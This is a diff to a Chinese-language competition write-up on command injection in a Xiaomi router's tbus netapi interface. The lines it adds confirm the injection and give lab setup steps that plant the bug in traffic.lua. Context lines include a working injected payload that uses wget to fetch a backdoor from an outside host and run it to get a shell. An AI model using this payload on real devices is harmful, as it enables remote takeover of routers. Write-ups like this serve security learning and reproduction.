@@ -140,6 +140,9 @@ tbus call netapi init '{"data":"re1111111"}'
 ```
 tbus call netapi init '{"data":"re$(touch /tmp/re111)"}'
 ```
+执行成功。    
+![](./img/ci.png)
+
 可以下载后门执行获取shell:   
 ```
 tbus call netapi init '{"data":"re$(wget http://192.168.31.7:8000/backdoor -O /tmp/backdoor ; chmod +x /tmp/backdoor ; /tmp/backdoor )111"}'
@@ -155,3 +158,15 @@ tbus call netapi init '{"data":"re$(wget http://192.168.31.7:8000/backdoor -O /t
 2. 抓流量写脚本
 
 最终我们比赛中采用抓流量写脚本的方式，较为稳定。    
+
+## 0x06 自己如何复现
+1. 购买个小米路由器Pro R3P   
+2. 刷开发版2.13.65    
+3. 开ssh（https://zhuanlan.zhihu.com/p/355522733）
+4. 修改traffic.lua，埋漏洞    
+```
+cp -r /usr/lib/lua/ /tmp/
+vi /tmp/lua/traffic.lua
+mount -o loop /tmp/lua/ /usr/lib/lua/
+```
+5. 可以开始复现了    
